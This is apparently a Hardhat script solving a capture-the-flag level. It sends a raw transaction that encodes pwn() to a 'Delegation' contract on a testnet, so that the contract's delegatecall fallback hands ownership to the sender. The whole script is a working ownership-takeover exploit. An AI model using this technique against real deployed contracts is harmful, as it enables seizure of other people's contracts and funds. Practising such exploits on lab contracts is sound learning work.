const { ethers } = require("hardhat")
const {
  abi: ABI,
} = require("../../artifacts/contracts/6/Delegate.sol/Delegate.json")
const {
  abi: ABIDelegation,
} = require("../../artifacts/contracts/6/Delegate.sol/Delegation.json")
require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* no DEPLOY, only send Tx */
/* we will send directly a low level tx to "Delegation" contract, using a wallet */
async function main() {
  /* delegation instance */
  const delegationContract = new ethers.Contract(
    "0xdC34fB75f2ceF254DfE08e4Bf41D8A5C0c357E0C",
    ABIDelegation,
    provider
  )

  // console.log("delegationContract", delegationContract)

  /* func sig */
  let iface = new ethers.utils.Interface(ABI)
  const encFuncData = iface.encodeFunctionData("pwn()").trim()
  console.log("encFuncData", encFuncData)

  // const tx = await delegationContract
  //   .connect(signer)
  //   .sendTransaction({ data: encFuncData })

  const tx = await signer.sendTransaction({
    to: delegationContract.address,
    data: encFuncData,
    /* @remind establecer "gasLimit", sino no es capaz de llamar al contrato "Delegate" desde "Delegation" */
    gasLimit: 10000000,
  })

  const res = await tx.wait()

  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/6/DeployAndCall__Attack.js --network mumbai
*/
